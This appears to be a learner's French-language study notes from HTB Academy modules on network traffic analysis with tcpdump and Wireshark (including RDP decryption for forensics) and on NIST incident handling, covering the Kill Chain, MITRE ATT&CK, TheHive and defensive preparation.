<p>Le module insiste sur un <strong>workflow d’analyse</strong> en quatre grandes phases :</p>
<h3>Analyse descriptive – <em>Qu’est-ce qui se passe ?</em></h3>
<ul>
<li>Définir l’<strong>incident</strong> :
<ul>
<li>lenteurs réseau, comportement étrange d’un poste, suspicion de malware, etc.</li>
</ul></li>
<li>Définir <strong>le scope et les objectifs</strong> :
<ul>
<li>hôtes / réseaux concernés</li>
<li>protocoles importants (HTTP, FTP, SMB, DNS, RDP, etc.)</li>
<li>période (ex. dernières 24h / 48h)</li>
</ul></li>
</ul>
<p>Exemple :</p>
<blockquote>
<p>“Sur le réseau 192.168.100.0/24, vérifier s’il y a des téléchargements de superbad.exe et new-crypto-miner.exe via HTTP ou FTP sur les dernières 48h.”</p>
</blockquote>
<h3>Analyse diagnostique – <em>Pourquoi ça se produit ?</em></h3>
<ul>
<li>Capturer le trafic au bon endroit :
<ul>
<li>SPAN / port mirroring, TAP, sur le même VLAN, ou sur la sortie Internet</li>
</ul></li>
<li><strong>Filtrer</strong> pour supprimer la baseline (trafic normal, bruit)</li>
<li>Isoler ce qui est intéressant :
<ul>
<li>hôtes suspects</li>
<li>ports non standards</li>
<li>fichiers transférés</li>
<li>erreurs et comportements anormaux</li>
</ul></li>
</ul>
<h3>Analyse prédictive – <em>Qu’est-ce que ça implique ?</em></h3>
<ul>
<li>Comparer aux comportements habituels (baselines)</li>
<li>Repérer des patterns :
<ul>
<li>beaconing (C2), commandes répétitives, timings réguliers, etc.</li>
</ul></li>
<li>Prendre des <strong>notes précises</strong> :
<ul>
<li>timestamps</li>
<li>IP / ports</li>
<li>numéros de paquets</li>
<li>noms de fichiers et URLs</li>
<li>identifiants utilisés</li>
</ul></li>
</ul>
<h3>Analyse prescriptive – <em>Que doit-on faire ?</em></h3>
<ul>
<li>Proposer des actions :
<ul>
<li>isoler un poste</li>
<li>bloquer une IP/domaine</li>
<li>filtrer un port</li>
<li>déclencher une vraie procédure d’Incident Response</li>
</ul></li>
<li>Faire un <strong>résumé clair</strong> :
<ul>
<li>ce qui s’est passé</li>
<li>les preuves (PCAP, logs, captures Wireshark)</li>
<li>les impacts possibles</li>
</ul></li>
</ul>
<h2>Tcpdump : fondamentaux et filtres</h2>
<h3>Commandes de base</h3>
<p>Vérifier si <code>tcpdump</code> est installé :</p>
<div class="codehilite">
<pre><span></span><code>which<span class="w"> </span>tcpdump
</code></pre>
</div>
<p>Lister les interfaces disponibles :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-D
</code></pre>
</div>
<p>Capturer sur l’interface <code>eth0</code> :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0
</code></pre>
</div>
<p>Capture un peu plus “lisible” (sans résolution DNS/port, verbeuse, ASCII+hex, 100 paquets) :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-nnvXc<span class="w"> </span><span class="m">100</span>
</code></pre>
</div>
<p>Options utiles :</p>
<ul>
<li><code>e</code> : inclure l’en-tête Ethernet</li>
<li><code>X</code> : afficher contenu en Hex + ASCII</li>
<li><code>XX</code> : idem mais avec en-tête Ethernet</li>
<li><code>v</code>, <code>vv</code>, <code>vvv</code> : verbosité croissante</li>
</ul>
<h3>Fichiers PCAP</h3>
<p>Écrire le trafic dans un fichier :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-w<span class="w"> </span>/tmp/capture.pcap
</code></pre>
</div>
<p>Lire un fichier PCAP :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-r<span class="w"> </span>/tmp/capture.pcap
</code></pre>
</div>
<p>(éventuellement avec <code>-nnvX</code> pour plus de détails)</p>
<h3>Filtres BPF (Berkeley Packet Filter)</h3>
<p>Filtres fréquents :</p>
<ul>
<li><p>Trafic impliquant un hôte précis :</p>
<div class="codehilite">
<pre><span></span><code>host<span class="w"> </span><span class="m">10</span>.10.20.1
</code></pre>
</div></li>
<li><p>Source ou destination spécifique :</p>
<div class="codehilite">
<pre><span></span><code>src<span class="w"> </span>host<span class="w"> </span><span class="m">172</span>.16.146.2
dst<span class="w"> </span>host<span class="w"> </span><span class="m">172</span>.16.146.2
</code></pre>
</div></li>
<li><p>Réseau entier :</p>
<div class="codehilite">
<pre><span></span><code>net<span class="w"> </span><span class="m">192</span>.168.1.0/24
</code></pre>
</div></li>
<li><p>Port spécifique :</p>
<div class="codehilite">
<pre><span></span><code>port<span class="w"> </span><span class="m">80</span>
</code></pre>
</div></li>
<li><p>Plage de ports :</p>
<div class="codehilite">
<pre><span></span><code>portrange<span class="w"> </span><span class="m">0</span>-1024
</code></pre>
</div></li>
<li><p>Protocole :</p>
<div class="codehilite">
<pre><span></span><code>tcp
udp
icmp
proto<span class="w"> </span><span class="m">17</span><span class="w">   </span><span class="c1"># UDP</span>
</code></pre>
</div></li>
<li><p>Taille de paquet :</p>
<div class="codehilite">
<pre><span></span><code>less<span class="w"> </span><span class="m">64</span>
greater<span class="w"> </span><span class="m">500</span>
</code></pre>
</div></li>
<li><p>Combinaisons :</p>
<ul>
<li><code>and</code>, <code>or</code>, <code>not</code> (ou <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>)</li>
</ul></li>
</ul>
<p>Exemples :</p>
<ul>
<li><p>Trafic destiné au réseau local :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>dst<span class="w"> </span>net<span class="w"> </span><span class="m">172</span>.16.146.0/24
</code></pre>
</div></li>
<li><p>Paquets avec le flag SYN TCP (scan, début de connexions) :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span><span class="s1">'tcp[13] &amp; 2 != 0'</span>
</code></pre>
</div></li>
<li><p>Pipe en temps réel vers <code>grep</code> (avec <code>l</code>) :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-Ar<span class="w"> </span>http.cap<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s1">'mailto:'</span>
</code></pre>
</div></li>
</ul>
<h2>Wireshark, TShark &amp; Termshark</h2>
<h3>Wireshark – Interface graphique</h3>
<p>Wireshark propose trois panneaux principaux :</p>
<ol>
<li><strong>Packet List</strong>
<ul>
<li>Numéro, temps, source, destination, protocole, informations</li>
</ul></li>
<li><strong>Packet Details</strong>
<ul>
<li>Découpage par couches (Ethernet, IP, TCP, HTTP, etc.)</li>
</ul></li>
<li><strong>Packet Bytes</strong>
<ul>
<li>Affichage en hexadécimal + ASCII, avec surbrillance de la zone sélectionnée</li>
</ul></li>
</ol>
<p>Deux familles de filtres :</p>
<ul>
<li><strong>Capture Filters</strong> (avant la capture – syntaxe BPF)
<ul>
<li>ex : <code>host 10.1.1.1 and port 80</code></li>
</ul></li>
<li><strong>Display Filters</strong> (pendant ou après – syntaxe Wireshark)
<ul>
<li>ex : <code>ip.addr == 192.168.1.10 &amp;&amp; http</code></li>
</ul></li>
</ul>
<p>Exemples de display filters :</p>
<ul>
<li><code>ip.addr == 172.16.146.2</code></li>
<li><code>dns</code>, <code>tcp</code>, <code>ftp</code>, <code>arp</code>, <code>http</code></li>
<li><code>tcp.port == 80</code></li>
<li><code>tcp.port != 80</code></li>
<li>Combinaisons : <code>and</code>, <code>or</code>, <code>not</code></li>
</ul>
<h3>TShark</h3>
<p>Version CLI de Wireshark :</p>
<ul>
<li><p>Lister les interfaces :</p>
<div class="codehilite">
<pre><span></span><code>tshark<span class="w"> </span>-D
</code></pre>
</div></li>
<li><p>Capturer sur une interface :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tshark<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-w<span class="w"> </span>/tmp/test.pcap
</code></pre>
</div></li>
<li><p>Lire un PCAP :</p>
<div class="codehilite">
<pre><span></span><code>tshark<span class="w"> </span>-r<span class="w"> </span>/tmp/test.pcap
</code></pre>
</div></li>
<li><p>Appliquer un filtre de capture :</p>
<div class="codehilite">
<pre><span></span><code>sudo<span class="w"> </span>tshark<span class="w"> </span>-i<span class="w"> </span>eth0<span class="w"> </span>-f<span class="w"> </span><span class="s2">"host 172.16.146.2"</span>
</code></pre>
</div></li>
<li><p>Afficher Hex + ASCII : <code>x</code></p></li>
</ul>
<h3>Termshark</h3>
<ul>
<li>Interface en mode texte (TUI) façon Wireshark dans le terminal.</li>
<li>Utilise les mêmes concepts que TShark / tcpdump, mais avec une interface interactive.</li>
</ul>
<h2>Wireshark – Usage avancé</h2>
<h3>Plugins : Statistics &amp; Analyze</h3>
<ul>
<li><strong>Statistics</strong>
<ul>
<li>Vue globale : Hierarchie de protocoles, Conversations, Endpoints, top talkers…</li>
</ul></li>
<li><strong>Analyze</strong>
<ul>
<li><code>Follow TCP Stream</code></li>
<li>Application de filtres</li>
<li><code>Expert Info</code> : erreurs, retransmissions, problèmes de protocole…</li>
</ul></li>
</ul>
<h3>Follow TCP Stream &amp; extraction de fichiers</h3>
<p>Wireshark peut <strong>reconstituer un flux TCP</strong> et en extraire le contenu :</p>
<ol>
<li>Clic droit sur un paquet → <em>Follow</em> → <em>TCP Stream</em></li>
<li>Voir la conversation complète (client/serveur en couleurs différentes)</li>
<li>Changer “Show and save data as” en <strong>Raw</strong> et sauvegarder dans un fichier</li>
</ol>
<p>Pour <strong>FTP</strong> :</p>
<ul>
<li><code>ftp</code> → vue globale des échanges FTP</li>
<li><code>ftp.request.command</code> → commandes (USER, PASS, RETR, etc.)</li>
<li><code>ftp-data</code> → données transférées (TCP 20), utile pour reconstruire des fichiers</li>
</ul>
<p>Pour <strong>HTTP</strong> :</p>
<ul>
<li>Filtre <code>http</code> pour voir <code>GET</code>, <code>POST</code>, <code>HTTP/1.1 200 OK</code>, etc.</li>
<li><code>File → Export Objects → HTTP</code> permet d’exporter :
<ul>
<li>images (ex : <code>Rise-Up.jpg</code>)</li>
<li>scripts</li>
<li>fichiers téléchargés</li>
</ul></li>
</ul>
<p>C’est comme ça qu’on peut extraire une image contenant un “Transformer Leader” dans le lab (<code>Rise-Up.jpg</code>).</p>
<h3>Déchiffrer RDP</h3>
<ul>
<li>RDP utilise généralement TLS sur le port TCP <strong>3389</strong> → trafic chiffré</li>
<li>Avec la <strong>clé privée RSA</strong> du serveur (<code>server.key</code>), on peut donner la clé à Wireshark :
<ol>
<li><code>Edit → Preferences → Protocols → TLS</code></li>
<li>Dans <em>RSA Keys List</em> :
<ul>
<li>IP : <code>10.129.43.29</code> (exemple)</li>
<li>Port : <code>3389</code></li>
<li>Protocole : <code>tpkt</code></li>
<li>Key file : <code>server.key</code></li>
</ul></li>
</ol></li>
</ul>
<p>Après rechargement :</p>
<ul>
<li>Le filtre <code>rdp</code> affiche les PDU RDP en clair</li>
<li>On peut alors voir :
<ul>
<li>quel <strong>client</strong> a initié la session</li>
<li>quel <strong>compte utilisateur</strong> a été utilisé (ex : <code>bucky</code>)</li>
<li>quelles actions ont été effectuées sur le serveur distant</li>
</ul></li>
</ul>
<h2>Scénarios &amp; cas d’usage vus dans les labs</h2>
<p>Les labs mettent en scène plusieurs scénarios pratiques :</p>
<ul>
<li>Un employé <strong>bob</strong> soupçonné de comportements malveillants</li>
<li>Création d’un nouvel utilisateur <code>hacker</code> sur un autre host via un shell (Netcat)</li>
<li>Utilisation d’un port non standard <strong>4444</strong> pour une connexion suspecte</li>
<li>Identification du serveur DNS interne <code>172.16.146.1</code></li>
<li>Trafic HTTP/FTP entre différents hôtes, récupération de fichiers, extraction d’images</li>
<li>Déchiffrement d’une session RDP pour voir :
<ul>
<li>qui se connecte sur quel serveur</li>
<li>avec quel compte (<code>bucky</code>)</li>
<li>depuis quelle machine</li>
</ul></li>
</ul>
<p>Ces exercices illustrent une démarche complète :</p>
<ol>
<li>partir d’un simple “comportement bizarre”,</li>
<li>capturer le trafic au bon endroit,</li>
<li>filtrer progressivement,</li>
<li>remonter jusqu’à des actions précises :
<ul>
<li>transfert de fichiers</li>
<li>création d’utilisateur</li>
<li>exécution de commandes à distance</li>
</ul></li>
</ol>
<h2>Conclusion</h2>
<p>Ce module m’a permis de :</p>
<ul>
<li>consolider les <strong>bases réseau</strong> (OSI/TCP/IP, TCP/UDP, principaux protocoles applicatifs)</li>
<li>apprendre à utiliser <strong>tcpdump</strong> de façon fine (switches, filtres BPF, PCAP)</li>
<li>maîtriser les notions de <strong>capture filters</strong> et <strong>display filters</strong> dans <strong>Wireshark</strong></li>
<li>exploiter des fonctions avancées :
<ul>
<li>Follow TCP Stream</li>
<li>extraction de fichiers HTTP/FTP</li>
<li>statistiques globales</li>
<li>Expert Info</li>
</ul></li>
<li>voir concrètement comment <strong>analyser un incident</strong> réseau de bout en bout :
<ul>
<li>de la suspicion initiale jusqu’à l’identification d’un compte (ex. <code>bucky</code>, <code>bob</code>, <code>hacker</code>),</li>
<li>d’un port (ex. <code>4444</code>),</li>
<li>ou d’un serveur clé (<code>172.16.146.1</code>).</li>
</ul></li>
</ul>
</div></details><details><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Incident Handling Process</strong></summary><div class="indented"><h2>Contexte du module</h2>
<p>Dans ce module HTB Academy, je suis dans le rôle d’<strong>analyste SOC / incident handler junior</strong>.
Objectifs principaux :</p>
<ul>
<li>Comprendre les <strong>fondamentaux de l’Incident Handling</strong> (IH) selon NIST.</li>
<li>Savoir utiliser des <strong>frameworks d’attaque</strong> (Cyber Kill Chain, MITRE ATT&amp;CK, Pyramid of Pain).</li>
<li>Prendre en main un <strong>outil de case management</strong> : <strong>TheHive</strong>.</li>
<li>Travailler sur une <strong>étude de cas réaliste</strong> : la compromission d’<strong>Insight Nexus</strong> (ManageEngine + AD + GPO + exfiltration).</li>
<li><p>Faire un peu de <strong>pratique logs / Wazuh</strong> (IOC, credential dumping, persistence, exfiltration, PowerShell malveillant, etc.).</p>
<p><figure class="image"><a href="image%202.png"><img alt="image.png" src="image%202.png"/></a></figure></p></li>
</ul>
<h2>Notions de base : événements, incidents &amp; incident handling</h2>
<h3>Événement vs incident</h3>
<ul>
<li><strong>Événement (event)</strong> : action qui se produit sur un système ou un réseau.
<ul>
<li>Ex : un utilisateur envoie un mail, un clic souris, un firewall accepte un flux.</li>
</ul></li>
<li><strong>Incident</strong> : événement avec un <strong>impact négatif</strong>.
<ul>
<li>Ex : crash système, accès non autorisé, vol de données, ransomware, etc.</li>
</ul></li>
</ul>
<p>Dans le module, un <strong>incident de sécurité IT</strong> est défini comme :</p>
<blockquote>
<p>un événement exécuté contre un système informatique avec une intention claire de nuire.</p>
</blockquote>
<p>Exemples :</p>
<ul>
<li>Vol de données / fonds.</li>
<li>Accès non autorisé à des données.</li>
<li>Installation de malware / RAT.</li>
</ul>
<p><strong>Incident handling</strong> = ensemble de <strong>procédures structurées</strong> pour <strong>gérer et répondre</strong> aux incidents dans un environnement IT.</p>
<h3>Pourquoi l’Incident Handling est critique ?</h3>
<ul>
<li>Les incidents touchent souvent des <strong>données personnelles / business</strong>.</li>
<li>Impact très variable : de quelques postes à une grosse partie du SI.</li>
<li>Une équipe d’Incident Response <strong>formée</strong> :
<ul>
<li>Réagit <strong>rapidement et systématiquement</strong>.</li>
<li>Limite le <strong>vol de données</strong> et la <strong>disruption de services</strong>.</li>
</ul></li>
<li>Les décisions <strong>avant, pendant et après</strong> l’incident conditionnent la gravité finale.</li>
</ul>
<p>Notions importantes :</p>
<ul>
<li><strong>Priorisation</strong> : tous les incidents n’ont pas le même impact.
On priorise selon la <strong>sévérité</strong>, le <strong>nombre de systèmes touchés</strong>, les <strong>actifs critiques</strong>, etc.</li>
<li><strong>Incident Manager</strong> :
<ul>
<li>Souvent SOC Manager, CISO/CIO ou prestataire de confiance.</li>
<li>Point de contact unique.</li>
<li>Coordonne les équipes, collecte les infos, suit les actions.</li>
</ul></li>
</ul>
<p>Une des références majeures : le <strong>NIST “Computer Security Incident Handling Guide”</strong>, qui fournit un modèle en 4 phases.</p>
<h2>Frameworks d’attaque et de détection</h2>
<h3>Cyber Kill Chain</h3>
<p>Le <strong>Cyber Kill Chain</strong> décrit le <strong>cycle de vie d’une attaque</strong> en 7 étapes :</p>
<ol>
<li><strong>Reconnaissance (Recon)</strong>
<ul>
<li>Choix de la cible, collecte d’infos : OSINT (LinkedIn, sites web, doc, job ads…), ou scans actifs (ports, services, apps exposées).</li>
</ul></li>
<li><strong>Weaponize (Armement)</strong>
<ul>
<li>Développement de la <strong>malware / exploit initial</strong>.</li>
<li>Payload léger, souvent furtif, capable de :
<ul>
<li>donner un accès distant,</li>
<li>persister,</li>
<li>télécharger d’autres outils.</li>
</ul></li>
<li>C’est <strong>à ce stade</strong> que <strong>le malware est développé</strong> (réponse à la question du module).</li>
</ul></li>
<li><strong>Delivery (Livraison)</strong>
<ul>
<li>Livraison du payload : phishing (pièce jointe ou lien), site web piégé, USB, téléphone + social engineering, etc.</li>
<li>But : que la victime <strong>exécute</strong> le truc (double-clic, macro, script…).</li>
</ul></li>
<li><strong>Exploitation</strong>
<ul>
<li>Le code malveillant est <strong>exécuté</strong> sur la machine cible (exploit, script, shellcode…).</li>
</ul></li>
<li><strong>Installation</strong>
<ul>
<li>Mise en place de la <strong>persistance</strong> :
<ul>
<li><strong>Droppers</strong></li>
<li><strong>Backdoors</strong></li>
<li><strong>Rootkits</strong></li>
</ul></li>
<li>Le “stager” initial installe ou télécharge d’autres composants.</li>
</ul></li>
<li><strong>Command &amp; Control (C2)</strong>
<ul>
<li>L’attaquant établit un <strong>canal de commande</strong> (HTTP(S), DNS, etc.).</li>
<li>Permet de <strong>contrôler la machine</strong>, télécharger de nouveaux modules, etc.</li>
</ul></li>
<li><strong>Actions on Objective</strong>
<ul>
<li>Objectif final : exfiltration de données, ransomware, destruction, espionnage, etc.</li>
</ul></li>
</ol>
<p>Important :
Le Kill Chain n’est <strong>pas linéaire</strong> en pratique. Les attaquants reviennent souvent en arrière (ex : après une première compromission, ils refont de la recon pour pivoter plus loin).</p>
<h3>MITRE ATT&amp;CK</h3>
<p><strong>MITRE ATT&amp;CK</strong> = matrice de <strong>tactiques</strong> et <strong>techniques</strong> basée sur des comportements adverses observés dans le monde réel.</p>
<ul>
<li><strong>Tactic</strong> = <strong>objectif</strong> haut niveau de l’attaquant (Initial Access, Persistence, Privilege Escalation, etc.).</li>
<li><strong>Technique</strong> = <strong>façon concrète</strong> de réaliser la tactique.
<ul>
<li>Identifiée par un <strong>ID</strong> : <code>T1105</code>, <code>T1021</code>, etc.</li>
</ul></li>
<li><strong>Sub-technique</strong> = variante précise d’une technique.
<ul>
<li>Ex : <code>T1003.001</code> = Credential Dumping – LSASS Memory.</li>
</ul></li>
</ul>
<p>Exemples vus dans le module :</p>
<ul>
<li><code>T1105 – Ingress Tool Transfer</code>
→ transfert d’outils/malwares depuis un C2 (wget, curl, etc.).</li>
<li><code>T1021 – Remote Services</code>
→ usage de SSH/RDP/SMB pour mouvement latéral.</li>
<li><code>T1003.001 – OS Credentials: LSASS Memory</code>
→ dump mémoire de LSASS pour voler les creds.</li>
<li><code>T1486 – Data Encrypted for Impact</code>
→ ransomware.</li>
</ul>
<p>ATT&amp;CK permet :</p>
<ul>
<li>De <strong>décrire précisément</strong> ce qu’on observe (“on a vu T1003.001”).</li>
<li>De <strong>prioriser</strong> les alertes.</li>
<li>De pointer vers des <strong>mitigations</strong> standard.</li>
</ul>
<h3>Pyramid of Pain</h3>
<p>La <strong>Pyramid of Pain</strong> illustre la difficulté pour un attaquant de changer ses IOC/TTP :</p>
<ul>
<li>Bas de la pyramide (faible “pain”) :
<ul>
<li><strong>Hashs</strong>, <strong>IP</strong>, <strong>domaines</strong> → triviales à changer.</li>
</ul></li>
<li>Milieu :
<ul>
<li><strong>Artifacts réseau/host</strong> (fichiers, registres, mutex…).</li>
<li><strong>Outils</strong> → déjà plus pénible à remplacer.</li>
</ul></li>
<li>Sommet :
<ul>
<li><strong>TTPs (tactics, techniques, procedures)</strong> → cœur de MITRE ATT&amp;CK.</li>
</ul></li>
</ul>
<p>Conclusion :</p>
<ul>
<li>Bloquer <strong>juste des IP / hashs</strong> = l’attaquant change 3 paramètres et continue.</li>
<li>Détecter les <strong>comportements MITRE / TTP</strong> = <strong>coût maximal</strong> pour l’adversaire.</li>
</ul>
<h3>Intégration MITRE ATT&amp;CK dans TheHive</h3>
<ul>
<li><strong>TheHive</strong> sert de <strong>plateforme de gestion d’alertes et de cas</strong>.</li>
<li>On peut :
<ul>
<li>importer les <strong>tactiques/techniques MITRE</strong>,</li>
<li>mapper des alertes (ex : Mimikatz → <code>T1003.001</code>),</li>
<li>ajouter des <strong>observables/IOCs</strong> (IP, fichiers, hash, hostname…),</li>
<li>suivre l’investigation dans un <strong>case</strong> centralisé.</li>
</ul></li>
</ul>
<h2>Processus d’Incident Handling (NIST)</h2>
<p>NIST découpe l’Incident Handling en <strong>4 phases</strong> :</p>
<ol>
<li><strong>Preparation</strong></li>
<li><strong>Detection &amp; Analysis</strong></li>
<li><strong>Containment, Eradication &amp; Recovery</strong></li>
<li><strong>Post-Incident Activity</strong></li>
</ol>
<p>C’est un <strong>cycle</strong>, pas une ligne droite. On peut revenir en arrière (ex : si des IOCs réapparaissent en Recovery → retour Investigation).</p>
<h3>Preparation – Partie 1 : capacité &amp; documentation</h3>
<p>Objectif : <strong>être prêt</strong> avant que ça explose.</p>
<h3>Prérequis de préparation</h3>
<ul>
<li><strong>Capacité IH dans l’organisation</strong> (interne ou via prestataire).</li>
<li><strong>Équipe IH compétente</strong> (incident handlers, SOC, DFIR…).</li>
<li><strong>Sensibilisation sécurité</strong> pour le reste des employés.</li>
<li><strong>Politiques &amp; documentation</strong> claires.</li>
<li><strong>Outils &amp; matériel</strong> adaptés.</li>
</ul>
<h3>Politiques &amp; docs</h3>
<p>Doit inclure :</p>
<ul>
<li>Contacts &amp; rôles :
<ul>
<li>membres de l’équipe IH,</li>
<li>légal, compliance, IT, management, communication, prestataires, ISP, etc.</li>
</ul></li>
<li><strong>Incident response policy / plan / procedures</strong>.</li>
<li><strong>Politique de partage d’info</strong> (internes, externes, CERT, autorités…).</li>
<li><strong>Baselines / golden image</strong> des systèmes.</li>
<li><strong>Cartographie réseau</strong> &amp; <strong>CMDB</strong> (assets).</li>
<li>Comptes <strong>privilégiés d’urgence</strong>, activables en cas d’incident puis désactivés + reset mot de passe.</li>
<li>Possibilité d’acheter rapidement un outil (&lt; $500) sans process d’achat complet.</li>
<li><strong>Cheat sheets forensic / investigative</strong>.</li>
<li>Processus pour les obligations légales (ex : <strong>RGPD</strong> → notification dans un délai donné).</li>
</ul>
<h3>Reporting &amp; notes d’incident</h3>
<p>Pendant l’incident, il faut <strong>tout noter</strong> :</p>
<ul>
<li>Qui ? Quoi ? Quand ? Où ? Pourquoi ? Comment ?</li>
<li><strong>Timestamps</strong>, actions effectuées, résultats, qui l’a fait.</li>
<li>Ce sera la base du <strong>rapport final</strong> + de la <strong>preuve en cas légal</strong>.</li>
</ul>
<h3>Preparation – Partie 2 : mesures de protection</h3>
<p>Même si la “protection” n’est pas uniquement le boulot de l’équipe IH, elle doit connaître <strong>ce qui est en place</strong> pour comprendre :</p>
<ul>
<li>ce qui est possible côté logs / detections,</li>
<li>le niveau de <strong>sophistication</strong> de l’attaque.</li>
</ul>
<h3>DMARC – anti-phishing</h3>
<ul>
<li>Basé sur <strong>SPF + DKIM</strong>, DMARC permet de <strong>rejeter</strong> des mails qui prétendent venir de notre domaine.</li>
<li>Très utile contre les <strong>fraudes par mail</strong> (faux comptable, faux CEO…).</li>
<li><strong>Attention aux tests</strong> → mal configuré, ça peut bloquer des mails légitimes, notamment ceux envoyés “on behalf of”.</li>
</ul>
<h3>Endpoint hardening &amp; EDR</h3>
<p>Endpoints = principale <strong>porte d’entrée</strong> (phishing, navigateurs, PJ, scripts).</p>
<p>Points clés :</p>
<ul>
<li>Appliquer des <strong>baselines</strong> (CIS / Microsoft).</li>
<li>Désactiver <strong>LLMNR / NetBIOS</strong>.</li>
<li>Implémenter <strong>LAPS</strong>, supprimer les droits admin aux users standard.</li>
<li>Configurer <strong>PowerShell</strong> en <strong>ConstrainedLanguage</strong>.</li>
<li>Activer les règles <strong>ASR</strong> (Attack Surface Reduction).</li>
<li><strong>Whitelisting</strong> / contrôle d’exécution :
<ul>
<li>Bloquer l’exécution depuis les dossiers <strong>user-writable</strong> (Downloads, Desktop, AppData…).</li>
<li>Bloquer les scripts <code>.hta</code>, <code>.vbs</code>, <code>.bat</code>, <code>.cmd</code>, <code>.js</code>…</li>
<li>Faire attention aux <strong>LOLBins</strong> (Living-Off-The-Land Binaries).</li>
</ul></li>
<li><strong>EDR</strong> intégrant <strong>AMSI</strong> pour inspecter les scripts obfusqués.</li>
</ul>
<h3>Protection réseau</h3>
<ul>
<li><strong>Segmentation</strong> : isoler les systèmes critiques, limiter strictement les flux nécessaires.</li>
<li>Pas d’expo directe d’assets internes sur Internet (DMZ si besoin).</li>
<li><strong>IDS/IPS</strong> :
<ul>
<li>idéalement avec <strong>décryptage TLS</strong> pour analyser le contenu, pas seulement l’IP.</li>
</ul></li>
<li><strong>Contrôle d’accès au réseau</strong> :
<ul>
<li>802.1X sur LAN/Wi-Fi.</li>
<li>En cloud, <strong>Conditional Access</strong> (ex. Entra ID) pour n’autoriser que les devices gérés.</li>
</ul></li>
</ul>
<h3>Identités / MFA / mots de passe</h3>
<ul>
<li>Vol de crédentials privilégiés = <strong>chemin d’escalade n°1</strong>.</li>
<li>Mauvaises pratiques :
<ul>
<li>mot de passe “complexe” mais trivial (<code>Password1!</code>, <code>Summer2021!</code>).</li>
<li>même mot de passe entre compte normal et compte admin.</li>
</ul></li>
<li>Recommandé :
<ul>
<li><strong>Passphrases</strong> longues, éventuellement multilingues.</li>
<li><strong>MFA</strong> au minimum sur tous les accès admins / sensibles.</li>
</ul></li>
</ul>
<h3>Vulnérabilités &amp; user awareness</h3>
<ul>
<li><strong>Scans de vulnérabilité</strong> réguliers → patcher les “High” &amp; “Critical”.</li>
<li>Segmentation ou compensations si patch impossible.</li>
<li><strong>Sensibilisation utilisateurs</strong> :
<ul>
<li>formation aux mails suspects, comportements anormaux,</li>
<li>tests réguliers (phishing simulé, clés USB abandonnées, etc.).</li>
</ul></li>
</ul>
<h3>AD security &amp; purple teaming</h3>
<ul>
<li><strong>Audit AD</strong> (en interne ou par presta) pour :
<ul>
<li>trouver les escalades faciles,</li>
<li>corriger les config dangereuses,</li>
<li>éliminer les “one-click pwn”.</li>
</ul></li>
<li><strong>Purple team</strong> :
<ul>
<li>Red Team attaque,</li>
<li>Blue Team observe &amp; défend,</li>
<li>on itère sur les playbooks et la détection (logs, alertes, corrélation).</li>
</ul></li>
</ul>
<h2>Detection &amp; Analysis</h2>
<h3>Sources de détection</h3>
<p>Un incident peut être détecté par :</p>
<ul>
<li>un <strong>employé</strong> qui remarque un comportement étrange,</li>
<li>un <strong>outil</strong> (EDR, IDS, firewall, SIEM…),</li>
<li>des activités de <strong>threat hunting</strong>,</li>
<li>un <strong>tiers</strong> (CERT, partenaire, fournisseur, autorité, etc.).</li>
</ul>
<p>On met en place plusieurs <strong>couches de détection</strong> :</p>
<ol>
<li><strong>Périmètre</strong> : firewalls, NIDS/NIPS, DMZ.</li>
<li><strong>Réseau interne</strong> : HIDS/HIPS, firewalls locaux.</li>
<li><strong>Endpoints</strong> : AV/EDR.</li>
<li><p><strong>Applications</strong> : logs applicatifs, web server logs, etc.</p>
<p><figure class="image"><a href="image%203.png"><img alt="image.png" src="image%203.png"/></a></figure></p></li>
</ol>
<h3>Investigation initiale &amp; timeline</h3>
<p>Avant de déclencher la grosse artillerie, on fait une <strong>investigation initiale</strong> :</p>
<ul>
<li>Quand l’incident a-t-il été signalé ? Par qui ?</li>
<li>Comment a-t-il été détecté ?</li>
<li>Quel type d’incident (phishing, indispo, compromission, etc.) ?</li>
<li>Quels systèmes sont impactés ?</li>
<li>Qui a accédé aux systèmes, quelles actions ont déjà été faites ?</li>
<li>Contexte technique :
<ul>
<li>OS, IP, hostname, owner, rôle, état actuel.</li>
</ul></li>
<li>Si malware :
<ul>
<li>liste des IP C2, horodatage, types de malware,</li>
<li>hash, noms de fichiers, copies pour analyse.</li>
</ul></li>
</ul>
<p>On construit ensuite une <strong>timeline</strong> avec au minimum :</p>
<ul>
<li>Date</li>
<li>Heure</li>
<li>Hostname</li>
<li>Description de l’événement</li>
<li>Source de données (logs, AV, EDR, etc.)</li>
</ul>
<p>Exemple du module :</p>
<blockquote>
<p>09/09/2021 – 13:31 CET – SQLServer01 – Mimikatz détecté – Antivirus</p>
</blockquote>
<p>Cette timeline sert à :</p>
<ul>
<li>garder une <strong>vision globale</strong>,</li>
<li>mettre les indices dans l’ordre,</li>
<li>savoir si un événement appartient ou non à l’incident en cours.</li>
</ul>
<h3>Sévérité, étendue &amp; communication</h3>
<p>Questions à se poser :</p>
<ul>
<li>Quel est l’<strong>impact</strong> de l’exploitation ?</li>
<li>Quels sont les <strong>pré-requis</strong> pour exploiter ?</li>
<li>Systèmes <strong>critiques</strong> potentiellement impactés ?</li>
<li>Combien de systèmes touchés ?</li>
<li>Exploit connu, utilisé “dans la nature” ?</li>
<li>Comportement de <strong>ver / worm</strong> ?</li>
</ul>
